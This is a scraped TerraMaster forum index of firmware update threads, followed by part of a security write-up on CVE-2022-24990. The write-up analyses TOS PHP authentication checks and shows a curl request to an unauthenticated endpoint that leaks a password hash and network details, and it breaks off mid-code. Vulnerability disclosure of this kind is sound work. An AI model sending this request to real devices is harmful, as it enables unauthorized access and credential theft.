  Last post by [DDC1](./memberlist.php?mode=viewprofile&u=9548&sid=85da3508c491a4101888188b2d7c6118) ![United States of America](./ext/rmcgirr83/nationalflags/flags/us.png "United States of America") « [30 Oct 2024, 01:29](./viewtopic.php?p=39375&sid=85da3508c491a4101888188b2d7c6118#p39375 "Go to last post")

  Replies: **41**
  by [TMRyan](./memberlist.php?mode=viewprofile&u=2597&sid=85da3508c491a4101888188b2d7c6118) ![China](./ext/rmcgirr83/nationalflags/flags/cn.png "China") » 12 Oct 2024, 18:20

  + [1](./viewtopic.php?t=6689&sid=85da3508c491a4101888188b2d7c6118)
  + [2](./viewtopic.php?t=6689&sid=85da3508c491a4101888188b2d7c6118&start=10)
  + [3](./viewtopic.php?t=6689&sid=85da3508c491a4101888188b2d7c6118&start=20)
  + [4](./viewtopic.php?t=6689&sid=85da3508c491a4101888188b2d7c6118&start=30)
  + [5](./viewtopic.php?t=6689&sid=85da3508c491a4101888188b2d7c6118&start=40)

  41 Replies
  12067 Views
  Last post by [DDC1](./memberlist.php?mode=viewprofile&u=9548&sid=85da3508c491a4101888188b2d7c6118) ![United States of America](./ext/rmcgirr83/nationalflags/flags/us.png "United States of America")

  30 Oct 2024, 01:29
* [TOS 6.0.507 (X86) is Released for Update](./viewtopic.php?t=6627&sid=85da3508c491a4101888188b2d7c6118)

  Last post by [koalakoala](./memberlist.php?mode=viewprofile&u=6298&sid=85da3508c491a4101888188b2d7c6118) « [11 Oct 2024, 14:16](./viewtopic.php?p=38851&sid=85da3508c491a4101888188b2d7c6118#p38851 "Go to last post")

  Replies: **65**
  by [TMRyan](./memberlist.php?mode=viewprofile&u=2597&sid=85da3508c491a4101888188b2d7c6118) ![China](./ext/rmcgirr83/nationalflags/flags/cn.png "China") » 30 Sep 2024, 12:13

  + [1](./viewtopic.php?t=6627&sid=85da3508c491a4101888188b2d7c6118)
  + …
  + [3](./viewtopic.php?t=6627&sid=85da3508c491a4101888188b2d7c6118&start=20)
  + [4](./viewtopic.php?t=6627&sid=85da3508c491a4101888188b2d7c6118&start=30)
  + [5](./viewtopic.php?t=6627&sid=85da3508c491a4101888188b2d7c6118&start=40)
  + [6](./viewtopic.php?t=6627&sid=85da3508c491a4101888188b2d7c6118&start=50)
  + [7](./viewtopic.php?t=6627&sid=85da3508c491a4101888188b2d7c6118&start=60)

  65 Replies
  19600 Views
  Last post by [koalakoala](./memberlist.php?mode=viewprofile&u=6298&sid=85da3508c491a4101888188b2d7c6118)

  11 Oct 2024, 14:16
* [TOS 6.0.460 (X86) Beta is Released for Update](./viewtopic.php?t=6506&sid=85da3508c491a4101888188b2d7c6118)

  Last post by [titan5](./memberlist.php?mode=viewprofile&u=3234&sid=85da3508c491a4101888188b2d7c6118) ![Canada](./ext/rmcgirr83/nationalflags/flags/ca.png "Canada") « [02 Oct 2024, 06:32](./viewtopic.php?p=38554&sid=85da3508c491a4101888188b2d7c6118#p38554 "Go to last post")

  Replies: **102**
  by [TMRyan](./memberlist.php?mode=viewprofile&u=2597&sid=85da3508c491a4101888188b2d7c6118) ![China](./ext/rmcgirr83/nationalflags/flags/cn.png "China") » 27 Aug 2024, 12:20

  + [1](./viewtopic.php?t=6506&sid=85da3508c491a4101888188b2d7c6118)
  + …
  + [7](./viewtopic.php?t=6506&sid=85da3508c491a4101888188b2d7c6118&start=60)
  + [8](./viewtopic.php?t=6506&sid=85da3508c491a4101888188b2d7c6118&start=70)
  + [9](./viewtopic.php?t=6506&sid=85da3508c491a4101888188b2d7c6118&start=80)
  + [10](./viewtopic.php?t=6506&sid=85da3508c491a4101888188b2d7c6118&start=90)
  + [11](./viewtopic.php?t=6506&sid=85da3508c491a4101888188b2d7c6118&start=100)

  102 Replies
  32280 Views
  Last post by [titan5](./memberlist.php?mode=viewprofile&u=3234&sid=85da3508c491a4101888188b2d7c6118) ![Canada](./ext/rmcgirr83/nationalflags/flags/ca.png "Canada")

  02 Oct 2024, 06:32
* [TOS 4.2.44 is Released for Update](./viewtopic.php?t=6002&sid=85da3508c491a4101888188b2d7c6118)

  Last post by [giangarga](./memberlist.php?mode=viewprofile&u=10133&sid=85da3508c491a4101888188b2d7c6118) ![Italy](./ext/rmcgirr83/nationalflags/flags/it.png "Italy") « [23 Aug 2024, 00:21](./viewtopic.php?p=37506&sid=85da3508c491a4101888188b2d7c6118#p37506 "Go to last post")

  Replies: **22**
   by [TMRyan](./memberlist.php?mode=viewprofile&u=2597&sid=85da3508c491a4101888188b2d7c6118) ![China](./ext/rmcgirr83/nationalflags/flags/cn.png "China") » 28 Mar 2024, 11:09

  + [1](./viewtopic.php?t=6002&sid=85da3508c491a4101888188b2d7c6118)
  + [2](./viewtopic.php?t=6002&sid=85da3508c491a4101888188b2d7c6118&start=10)
  + [3](./viewtopic.php?t=6002&sid=85da3508c491a4101888188b2d7c6118&start=20)

  22 Replies
  13065 Views
  Last post by [giangarga](./memberlist.php?mode=viewprofile&u=10133&sid=85da3508c491a4101888188b2d7c6118) ![Italy](./ext/rmcgirr83/nationalflags/flags/it.png "Italy")

  23 Aug 2024, 00:21
* [TOS 4.2.20(ARM) is released for update](./viewtopic.php?t=2887&sid=85da3508c491a4101888188b2d7c6118)

  Last post by [TMzethar](./memberlist.php?mode=viewprofile&u=2405&sid=85da3508c491a4101888188b2d7c6118) « [05 Jul 2024, 18:21](./viewtopic.php?p=36415&sid=85da3508c491a4101888188b2d7c6118#p36415 "Go to last post")

  Replies: **26**
   by [TMSupport](./memberlist.php?mode=viewprofile&u=59&sid=85da3508c491a4101888188b2d7c6118) » 13 Jan 2022, 18:22

  + [1](./viewtopic.php?t=2887&sid=85da3508c491a4101888188b2d7c6118)
  + [2](./viewtopic.php?t=2887&sid=85da3508c491a4101888188b2d7c6118&start=10)
  + [3](./viewtopic.php?t=2887&sid=85da3508c491a4101888188b2d7c6118&start=20)

  26 Replies
  18441 Views
  Last post by [TMzethar](./memberlist.php?mode=viewprofile&u=2405&sid=85da3508c491a4101888188b2d7c6118)

  05 Jul 2024, 18:21
* [TNAS mobile 3.2.25 for iOS Officially Launched](./viewtopic.php?t=5143&sid=85da3508c491a4101888188b2d7c6118)

  Last post by [TMzethar](./memberlist.php?mode=viewprofile&u=2405&sid=85da3508c491a4101888188b2d7c6118) « [05 Jul 2024, 18:07](./viewtopic.php?p=36414&sid=85da3508c491a4101888188b2d7c6118#p36414 "Go to last post")

  Replies: **23**
   by [TMzethar](./memberlist.php?mode=viewprofile&u=2405&sid=85da3508c491a4101888188b2d7c6118) » 11 Sep 2023, 11:33

  + [1](./viewtopic.php?t=5143&sid=85da3508c491a4101888188b2d7c6118)
  + [2](./viewtopic.php?t=5143&sid=85da3508c491a4101888188b2d7c6118&start=10)
  + [3](./viewtopic.php?t=5143&sid=85da3508c491a4101888188b2d7c6118&start=20)

  23 Replies
  29588 Views
  Last post by [TMzethar](./memberlist.php?mode=viewprofile&u=2405&sid=85da3508c491a4101888188b2d7c6118)

  05 Jul 2024, 18:07
* [TOS 4.2.41(ARM) is Released for Update](./viewtopic.php?t=4117&sid=85da3508c491a4101888188b2d7c6118)

  Last post by [amaury](./memberlist.php?mode=viewprofile&u=9768&sid=85da3508c491a4101888188b2d7c6118) ![United States of America](./ext/rmcgirr83/nationalflags/flags/us.png "United States of America") « [01 Jul 2024, 15:10](./viewtopic.php?p=36277&sid=85da3508c491a4101888188b2d7c6118#p36277 "Go to last post")

  Replies: **28**
   by [TMSupport](./memberlist.php?mode=viewprofile&u=59&sid=85da3508c491a4101888188b2d7c6118) » 14 Jan 2023, 14:58

  + [1](./viewtopic.php?t=4117&sid=85da3508c491a4101888188b2d7c6118)
  + [2](./viewtopic.php?t=4117&sid=85da3508c491a4101888188b2d7c6118&start=10)
  + [3](./viewtopic.php?t=4117&sid=85da3508c491a4101888188b2d7c6118&start=20)

  28 Replies
  18873 Views
  Last post by [amaury](./memberlist.php?mode=viewprofile&u=9768&sid=85da3508c491a4101888188b2d7c6118) ![United States of America](./ext/rmcgirr83/nationalflags/flags/us.png "United States of America")

  01 Jul 2024, 15:10
* [TOS 5.1.123 (X86) is Released for Update](./viewtopic.php?t=5722&sid=85da3508c491a4101888188b2d7c6118)

  Last post by [TMcola](./memberlist.php?mode=viewprofile&u=7668&sid=85da3508c491a4101888188b2d7c6118) ![China](./ext/rmcgirr83/nationalflags/flags/cn.png "China") « [11 May 2024, 00:08](./viewtopic.php?p=35220&sid=85da3508c491a4101888188b2d7c6118#p35220 "Go to last post")

  Replies: **47**
   by [TMRyan](./memberlist.php?mode=viewprofile&u=2597&sid=85da3508c491a4101888188b2d7c6118) ![China](./ext/rmcgirr83/nationalflags/flags/cn.png "China") » 23 Jan 2024, 10:02

  + [1](./viewtopic.php?t=5722&sid=85da3508c491a4101888188b2d7c6118)
  + [2](./viewtopic.php?t=5722&sid=85da3508c491a4101888188b2d7c6118&start=10)
  + [3](./viewtopic.php?t=5722&sid=85da3508c491a4101888188b2d7c6118&start=20)
  + [4](./viewtopic.php?t=5722&sid=85da3508c491a4101888188b2d7c6118&start=30)
  + [5](./viewtopic.php?t=5722&sid=85da3508c491a4101888188b2d7c6118&start=40)

  47 Replies
  26345 Views
  Last post by [TMcola](./memberlist.php?mode=viewprofile&u=7668&sid=85da3508c491a4101888188b2d7c6118) ![China](./ext/rmcgirr83/nationalflags/flags/cn.png "China")

  11 May 2024, 00:08
* [TOS 5.1.67 (X86) is Released for Update](./viewtopic.php?t=5088&sid=85da3508c491a4101888188b2d7c6118)

  Last post by [TMeric](./memberlist.php?mode=viewprofile&u=7405&sid=85da3508c491a4101888188b2d7c6118) « [20 Apr 2024, 09:08](./viewtopic.php?p=34838&sid=85da3508c491a4101888188b2d7c6118#p34838 "Go to last post")

  Replies: **81**
   by [TMRyan](./memberlist.php?mode=viewprofile&u=2597&sid=85da3508c491a4101888188b2d7c6118) ![China](./ext/rmcgirr83/nationalflags/flags/cn.png "China") » 25 Aug 2023, 09:52

  + [1](./viewtopic.php?t=5088&sid=85da3508c491a4101888188b2d7c6118)
  + …
  + [5](./viewtopic.php?t=5088&sid=85da3508c491a4101888188b2d7c6118&start=40)
  + [6](./viewtopic.php?t=5088&sid=85da3508c491a4101888188b2d7c6118&start=50)
  + [7](./viewtopic.php?t=5088&sid=85da3508c491a4101888188b2d7c6118&start=60)
  + [8](./viewtopic.php?t=5088&sid=85da3508c491a4101888188b2d7c6118&start=70)
  + [9](./viewtopic.php?t=5088&sid=85da3508c491a4101888188b2d7c6118&start=80)

  81 Replies
  55202 Views
  Last post by [TMeric](./memberlist.php?mode=viewprofile&u=7405&sid=85da3508c491a4101888188b2d7c6118)

  20 Apr 2024, 09:08
* [TOS 4.2.43(ARM) is Released for Update](./viewtopic.php?t=4840&sid=85da3508c491a4101888188b2d7c6118)

  Last post by [pipa89](./memberlist.php?mode=viewprofile&u=8646&sid=85da3508c491a4101888188b2d7c6118) ![Spain](./ext/rmcgirr83/nationalflags/flags/es.png "Spain") « [28 Mar 2024, 06:35](./viewtopic.php?p=34315&sid=85da3508c491a4101888188b2d7c6118#p34315 "Go to last post")

  Replies: **49**
  by [TMRyan](./memberlist.php?mode=viewprofile&u=2597&sid=85da3508c491a4101888188b2d7c6118) ![China](./ext/rmcgirr83/nationalflags/flags/cn.png "China") » 20 Jun 2023, 16:35

  + [1](./viewtopic.php?t=4840&sid=85da3508c491a4101888188b2d7c6118)
  + [2](./viewtopic.php?t=4840&sid=85da3508c491a4101888188b2d7c6118&start=10)
  + [3](./viewtopic.php?t=4840&sid=85da3508c491a4101888188b2d7c6118&start=20)
  + [4](./viewtopic.php?t=4840&sid=85da3508c491a4101888188b2d7c6118&start=30)
  + [5](./viewtopic.php?t=4840&sid=85da3508c491a4101888188b2d7c6118&start=40)

  49 Replies
  29783 Views
  Last post by [pipa89](./memberlist.php?mode=viewprofile&u=8646&sid=85da3508c491a4101888188b2d7c6118) ![Spain](./ext/rmcgirr83/nationalflags/flags/es.png "Spain")

  28 Mar 2024, 06:35
* [TOS 5.1.29 (X86) is Released for Update](./viewtopic.php?t=4424&sid=85da3508c491a4101888188b2d7c6118)

  Last post by [1GOG](./memberlist.php?mode=viewprofile&u=8724&sid=85da3508c491a4101888188b2d7c6118) « [29 Jan 2024, 00:47](./viewtopic.php?p=32834&sid=85da3508c491a4101888188b2d7c6118#p32834 "Go to last post")

  Replies: **80**
  by [TMRyan](./memberlist.php?mode=viewprofile&u=2597&sid=85da3508c491a4101888188b2d7c6118) ![China](./ext/rmcgirr83/nationalflags/flags/cn.png "China") » 24 Mar 2023, 11:25

  + [1](./viewtopic.php?t=4424&sid=85da3508c491a4101888188b2d7c6118)
  + …
  + [5](./viewtopic.php?t=4424&sid=85da3508c491a4101888188b2d7c6118&start=40)
  + [6](./viewtopic.php?t=4424&sid=85da3508c491a4101888188b2d7c6118&start=50)
  + [7](./viewtopic.php?t=4424&sid=85da3508c491a4101888188b2d7c6118&start=60)
  + [8](./viewtopic.php?t=4424&sid=85da3508c491a4101888188b2d7c6118&start=70)
  + [9](./viewtopic.php?t=4424&sid=85da3508c491a4101888188b2d7c6118&start=80)

  80 Replies
  76726 Views
  Last post by [1GOG](./memberlist.php?mode=viewprofile&u=8724&sid=85da3508c491a4101888188b2d7c6118)

  29 Jan 2024, 00:47
* [TOS 5.1.103 (X86) is Released for Update](./viewtopic.php?t=5447&sid=85da3508c491a4101888188b2d7c6118)

  Last post by [Grimsbeard](./memberlist.php?mode=viewprofile&u=8615&sid=85da3508c491a4101888188b2d7c6118) « [18 Jan 2024, 09:38](./viewtopic.php?p=32630&sid=85da3508c491a4101888188b2d7c6118#p32630 "Go to last post")

  Replies: **50**
   by [TMRyan](./memberlist.php?mode=viewprofile&u=2597&sid=85da3508c491a4101888188b2d7c6118) ![China](./ext/rmcgirr83/nationalflags/flags/cn.png "China") » 04 Dec 2023, 17:22

  + [1](./viewtopic.php?t=5447&sid=85da3508c491a4101888188b2d7c6118)
  + [2](./viewtopic.php?t=5447&sid=85da3508c491a4101888188b2d7c6118&start=10)
  + [3](./viewtopic.php?t=5447&sid=85da3508c491a4101888188b2d7c6118&start=20)
  + [4](./viewtopic.php?t=5447&sid=85da3508c491a4101888188b2d7c6118&start=30)
  + [5](./viewtopic.php?t=5447&sid=85da3508c491a4101888188b2d7c6118&start=40)
  + [6](./viewtopic.php?t=5447&sid=85da3508c491a4101888188b2d7c6118&start=50)

  50 Replies
  32978 Views
  Last post by [Grimsbeard](./memberlist.php?mode=viewprofile&u=8615&sid=85da3508c491a4101888188b2d7c6118)

  18 Jan 2024, 09:38

[New Topic](./posting.php?mode=post&f=28&sid=85da3508c491a4101888188b2d7c6118 "Post a new topic")

Display: All Topics1 day7 days2 weeks1 month3 months6 months1 year
Sort by: AuthorPost timeRepliesSubjectViews
Direction: AscendingDescending

---

82 topics

* 1
* [2](./viewforum.php?f=28&sid=85da3508c491a4101888188b2d7c6118&start=25)
* [3](./viewforum.php?f=28&sid=85da3508c491a4101888188b2d7c6118&start=50)
* [4](./viewforum.php?f=28&sid=85da3508c491a4101888188b2d7c6118&start=75)
* [Next](./viewforum.php?f=28&sid=85da3508c491a4101888188b2d7c6118&start=25)

[Return to Board Index](./index.php?sid=85da3508c491a4101888188b2d7c6118)

Jump to

* [GENERAL](./viewforum.php?f=2&sid=85da3508c491a4101888188b2d7c6118)
* [↳   News & Announcements](./viewforum.php?f=7&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Know More About TOS 5](./viewforum.php?f=87&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Know More About TOS 6](./viewforum.php?f=97&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Lounge and Boast](./viewforum.php?f=8&sid=85da3508c491a4101888188b2d7c6118)
* [TNAS (TerraMaster NAS)](./viewforum.php?f=3&sid=85da3508c491a4101888188b2d7c6118)
* [↳   FAQ & User Guides](./viewforum.php?f=75&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Initialization & installation](./viewforum.php?f=76&sid=85da3508c491a4101888188b2d7c6118)
* [↳   System Configuration](./viewforum.php?f=81&sid=85da3508c491a4101888188b2d7c6118)
* [↳   File Service](./viewforum.php?f=77&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Networking](./viewforum.php?f=78&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Storage](./viewforum.php?f=79&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Backup & restore](./viewforum.php?f=80&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Hardware](./viewforum.php?f=82&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Applications](./viewforum.php?f=83&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Update Notice](./viewforum.php?f=28&sid=85da3508c491a4101888188b2d7c6118)
* [↳   TOS](./viewforum.php?f=10&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Initialization](./viewforum.php?f=21&sid=85da3508c491a4101888188b2d7c6118)
* [↳   System Update](./viewforum.php?f=96&sid=85da3508c491a4101888188b2d7c6118)
* [↳   System Configuration](./viewforum.php?f=22&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Privileges](./viewforum.php?f=108&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Network & Remote Access](./viewforum.php?f=23&sid=85da3508c491a4101888188b2d7c6118)
* [↳   File Services](./viewforum.php?f=24&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Storage](./viewforum.php?f=25&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Compatibility](./viewforum.php?f=26&sid=85da3508c491a4101888188b2d7c6118)
* [↳   System Resources](./viewforum.php?f=71&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Security](./viewforum.php?f=88&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Mobile Apps and Desktop Clients](./viewforum.php?f=33&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Data Backup](./viewforum.php?f=31&sid=85da3508c491a4101888188b2d7c6118)
* [↳   How to back up? Which one is right for me?](./viewforum.php?f=107&sid=85da3508c491a4101888188b2d7c6118)
* [↳   TerraSync](./viewforum.php?f=90&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Centralized Backup](./viewforum.php?f=91&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Duple Backup](./viewforum.php?f=72&sid=85da3508c491a4101888188b2d7c6118)
* [↳   USB Copy](./viewforum.php?f=39&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Snapshot](./viewforum.php?f=40&sid=85da3508c491a4101888188b2d7c6118)
* [↳   CloudSync](./viewforum.php?f=41&sid=85da3508c491a4101888188b2d7c6118)
* [↳   TFM Backup](./viewforum.php?f=102&sid=85da3508c491a4101888188b2d7c6118)
* [↳   TFSS](./viewforum.php?f=103&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Rsync](./viewforum.php?f=104&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Time Machine](./viewforum.php?f=105&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Multimedia](./viewforum.php?f=106&sid=85da3508c491a4101888188b2d7c6118)
* [↳   DLNA/Multimedia Services](./viewforum.php?f=27&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Multimedia Server](./viewforum.php?f=94&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Photos](./viewforum.php?f=89&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Plex](./viewforum.php?f=51&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Emby](./viewforum.php?f=100&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Jellyfin](./viewforum.php?f=101&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Virtualization](./viewforum.php?f=98&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Docker](./viewforum.php?f=43&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Virtual Machines](./viewforum.php?f=73&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Other Applications](./viewforum.php?f=35&sid=85da3508c491a4101888188b2d7c6118)
* [↳   iSCSI Target](./viewforum.php?f=38&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Surveillance Manager](./viewforum.php?f=92&sid=85da3508c491a4101888188b2d7c6118)
* [↳   VPN Server](./viewforum.php?f=93&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Download](./viewforum.php?f=62&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Web Server/PHP/MySQL/MariaDB](./viewforum.php?f=32&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Terra Search](./viewforum.php?f=95&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Others](./viewforum.php?f=69&sid=85da3508c491a4101888188b2d7c6118)
* [↳   New Features Wanted](./viewforum.php?f=12&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Developer Discussion Room](./viewforum.php?f=37&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Hardware, Power and Accessories](./viewforum.php?f=9&sid=85da3508c491a4101888188b2d7c6118)
* [TDAS (TerraMaster DAS)](./viewforum.php?f=5&sid=85da3508c491a4101888188b2d7c6118)
* [↳   FAQ & User Guides](./viewforum.php?f=84&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Thunderbolt 3 Series](./viewforum.php?f=85&sid=85da3508c491a4101888188b2d7c6118)
* [↳   USB Series](./viewforum.php?f=86&sid=85da3508c491a4101888188b2d7c6118)
* [↳   Thunderbolt 3 Series](./viewforum.php?f=66&sid=85da3508c491a4101888188b2d7c6118)
* [↳   USB Series](./viewforum.php?f=67&sid=85da3508c491a4101888188b2d7c6118)

### Forum permissions

You **cannot** post new topics in this forum
You **cannot** reply to topics in this forum
You **cannot** edit your posts in this forum
You **cannot** delete your posts in this forum

* [Board index](./index.php?sid=85da3508c491a4101888188b2d7c6118)
* All times are UTC+08:00
* [Delete cookies](./ucp.php?mode=delete_cookies&sid=85da3508c491a4101888188b2d7c6118)
* [Contact us](./memberlist.php?mode=contactadmin&sid=85da3508c491a4101888188b2d7c6118)

Powered by [phpBB](https://www.phpbb.com/)® Forum Software © phpBB Limited

[Privacy](./ucp.php?mode=privacy&sid=85da3508c491a4101888188b2d7c6118 "Privacy")
|
[Terms](./ucp.php?mode=terms&sid=85da3508c491a4101888188b2d7c6118 "Terms")

###

![](/en/app.php/cron/cron.task.text_reparser.phpbb_pages?sid=85da3508c491a4101888188b2d7c6118)



=== Content from octagon.net_03b22009_20250108_160254.html ===


[![](/imgs/oct.png)](https://octagon.net/blog/)
Menu

* [About](https://www.octagon.net/about)
* [Contact Us](https://www.octagon.net/contact)

# CVE-2022-24990: TerraMaster TOS unauthenticated remote command execution via PHP Object Instantiation

March 7, 2022
  |  [No Comments](https://octagon.net/blog/2022/03/07/cve-2022-24990-terrmaster-tos-unauthenticated-remote-command-execution-via-php-object-instantiation/#respond)

## Introduction

This report explains how researchers at Octagon Networks were able to chain two interesting vulnerabilities to achieve unauthenticated remote command execution as root on TerraMaster NAS devices running TOS version 4.2.29. Patches are distributed for 4.2.31 now.

## Analyzing the PHP files

After downloading the installation package of the latest TOS package from the official download site and extracting it using binwalk, we can see the platform uses nginx server with PHP scripts. The PHP scripts are encrypted on disk. After decrypting them and analyzing their content, there is an interesting php script – /usr/www/module/api.php.

The script starts parsing the uri components in the following manner.

```
$in = router();
$URI = $in['URLremote'];
if (!isset($URI[0]) || $URI[0] == '')
  $URI[0] = $default_controller;
if (!isset($URI[1]) || $URI[1] == '')
  $URI[1] = $default_action;

define('Module', $URI[0]);
define('Action', $URI[1]);
$class = Module;
$function = Action;
```

The `router` function parses the get parameters and assigns them in such a way that if the request is <http://target/module/api.php?XXXX/YYYY>, then `$class` will be XXXX, and `$function` is YYYY.

It then checks if the function is in an array of `NO_LOGIN_CHECK`, and if it’s not, it sets `REQUEST MODE` to 1. This will be important detail for the exploit later.

```
$GLOBALS['NO_LOGIN_CHECK'] = array(
      "webNasIPS",
      "getDiskList",
      "createRaid",
      "getInstallStat",
      "getIsConfigAdmin",
      "setAdminConfig",
      "isConnected"
);
if (!in_array($function, $GLOBALS['NO_LOGIN_CHECK'])) {
      define('REQUEST_MODE', 1);
} else {
      define('REQUEST_MODE', 0);
}
```

It then instantiates the class stated by `$class` and calls the method stated by `$function`.

```
$instance = new $class();
if (!in_array($function, $class::$notHeader)) {
 #防止请求重放验证...
 if (tos_encrypt_str($_SERVER['HTTP_TIMESTAMP']) != $_SERVER['HTTP_SIGNATURE'] || $_SERVER['REQUEST_TIME'] - $_SERVER['HTTP_TIMESTAMP'] > 300) {
   $instance->output("Illegal request, timeout!", 0);
 }
} $instance->$function();
```

One thing to notice here is that the line `if (!in_array($function, $class::$notHeader)) {`. If our function is not in an array by the name of `$notHeadeer`, then a check will be made. It takes the TIMESTAMP http header and passes it to a function called `tos_encrypt_str`, and compares the output of the function to the value in SIGNATURE http header. It then checks if the timestamp is not older than 5 minutes. The `tos_encrypt_str` is a custom hashing function, which we will come to analyze later to figure out how SIGNATURE is created.

Looking for php scripts which have classes which can be invoked this way, I came across `/usr/www/include/class/mobile.class.php`. To start off, it has two arrays of method name, `$notCheck` and `$notHeader`.

```
static $notCheck = [
        "webNasIPS", "getDiskList", "createRaid", "getInstallStat",
        "getIsConfigAdmin",  "setAdminConfig", "isConnected", 'createid',
        'user_create',  'user_bond', 'user_release', 'login',
        'logout', 'checkCode', "wapNasIPS"
];
//不验证头信息是否匹配...
static $notHeader = [
        "fileDownload", "videoPlay", "imagesThumb",
        "imagesView", "fileUpload", "tempClear",
        "wapNasIPS", "webNasIPS", "isConnected"
];
```

Then it makes three check in its constructor.

```
if (!in_array(Action, self::$notHeader)) {
    if (!strstr($_SERVER['HTTP_USER_AGENT'], "TNAS") || !isset($_SERVER['HTTP_AUTHORIZATION']) || $this->REQUESTCODE != $_SERVER['HTTP_AUTHORIZATION']) {
        $this->output("Illegal request, please use genuine software!", false);
    }
}
```

The first check ensures that if the method name invoked is not in `$notHeader` array, it tests whether the user-agent http header is ‘TNAS’ and AUTHORIZATION header is equal to `$this->REQUESTCODE`. Otherwise it exits with an error message. The AUTHORIZATION header will be important later on. For now, let’s proceed to the second check.

```
if (REQUEST_MODE) {
   if (!isset($_SESSION)) {
     $this->output("session write error!", false);
   } else {
     $this->user = &$_SESSION['kod_user'];
   }
   if (isset($this->in['PHPSESSID'])) {
     $this->sessionid = $this->in['PHPSESSID'];
   }
}
```

if `REQUEST_MODE` is set, then it checks whether the user is logged in. Otherwise it will exit. And the final check:

```
if (!in_array(Action, self::$notCheck)) {
     if (!$this->loginCheck()) {
          $this->output("login is timeout", 0);
     }
}
```

It checks whether the method name is in `$notCheck`, and exits with an error if it’s not.

## Severe Information Leak: CVE-2022-24990

So, with the knowledge of the two php script chains, we know that the seven functions “webNasIPS”, “getDiskList”, “createRaid”, “getInstallStat”, “getIsConfigAdmin”, “setAdminConfig”, “isConnected” are in `NO_LOGIN_CHECK` array in `api.php`, and will set `REQUEST_MODE` to 0, passing one of the checks in `mobile.class.php`. And upon further checking these functions, `webNasIPS` is the only function which is both in `$notCheck` and `$notHeader` arrays of `mobile.class.php`‘s constructor, which effectively can pass two remaining checks. Let’s call webNasIPS and see what it returns.

```
$ curl -vk 'http://XXXX/module/api.php?mobile/webNasIPS' -H 'User-Agent: TNAS' * Trying XXXX... * Connected to 127.0.0.1 (127.0.0.1) port 22056 (#0)
> GET /module/api.php?mobile/webNasIPS HTTP/1.1
> Host: 127.0.0.1:22056
> User-Agent: TNAS < HTTP/1.1 200 OK < Date: Mon, 10 Jan 2022 14:10:40 GMT < Content-Type: application/json; charset=utf-8 < Transfer-Encoding: chunked < Connection: keep-alive < X-Powered-By: TerraMaster * Connection #0 to host 127.0.0.1 left intact {"code":true,"msg":"webNasIPS successful","data":"NOTIFY Message\nIFC:10.0.2.2\nADDR:525400123456\nPWD:$1$2kc1Zqe8$gighkBlDDDFHpG3RkZtws1\nSAT:1\nDAT:[{\"hostname\":\"ubuntu1604-aarch64\",\"firmware\":\"TOS3_A1.0_4.2.17\",\"sn\":\"\",\"version\":\"2110301418\"},{\"network\":\"eth0\",\"ip\":\"10.0.2.15\",\"mask\":\"255.255.255.0\",\"mac\":\"52:54:00:12:34:56\"},{\"service\":[{\"name\":\"http_ssl\",\"url\":\"\",\"port\":\"5443\"},{\"name\":\"http\",\"url\":\"XXXX\",\"port\":\"8181\"},{\"name\":\"sys\",\"url\":\"XXXX\",\"port\":\"8181\"},{\"name\":\"channel\",\"url\":\"\",\"port\":0},{\"name\":\"pt\",\"url\":\"\",\"port\":0},{\"name\":\"ftp\",\"url\":\"\",\"port\":21},{\"name\":\"web_dav\",\"url\":\"\",\"port\":0},{\"name\":\"smb\",\"url\":\"\",\"port\":0}]}]","time":2.920037031173706}
```

It returns a lot of interesting data. Let’s look at the function webNasIPS

```
function webNasIPS() {
    if (strstr($_SERVER['HTTP_USER_AGENT'], "TNAS")) {
        $core = new core();
        $dataSheet[0] = [
            "hostname" => $core->_hostname(),
            "firmware" => $core->_version(),
            "sn" => $core->_system_product_name(),
            "version" => $core->_VersionNumber()
        ];
        $defaultgw = $core->_default_RJ45();
        $eth = $core->_netlist($defaultgw);
        $dataSheet[1] = array(
            "network" => $defaultgw,
            "ip" => $eth['ip'],
            "mask" => $eth['mask'],
            "mac" => $eth['mac']
        );
        $dataSheet[2] = array("service" => $this->_getservicelist());
        $ifc = $_SERVER['REMOTE_ADDR'];
        $addr = preg_replace("/[:\n\r]+/", "", file_get_contents("/sys/class/net/eth0/address"));
        $pwd = $this->REQUESTCODE;
        if (!file_exists("/tmp/databack/complete")) {
            $sat = -1;
        } else if (!empty($this->_exec("df-json | awk '/\/mnt\/md/'"))) {
            $sat = !file_exists(USER_SYSTEM . '/install.lock') ? 2 : 1;
        } else {
            $sat = 0;
